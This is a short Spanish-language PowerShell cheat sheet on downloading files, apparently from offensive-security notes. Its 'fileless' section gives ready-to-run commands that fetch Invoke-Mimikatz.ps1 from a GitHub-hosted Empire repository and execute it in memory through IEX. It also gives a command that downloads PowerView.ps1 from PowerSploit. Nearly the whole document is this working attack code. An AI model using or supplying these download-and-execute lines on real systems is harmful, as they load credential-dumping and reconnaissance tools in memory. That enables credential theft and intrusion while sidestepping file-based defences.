## Descarga de archivos PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

## Descarga de archivos PowerShell: Metodo sin archivos

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
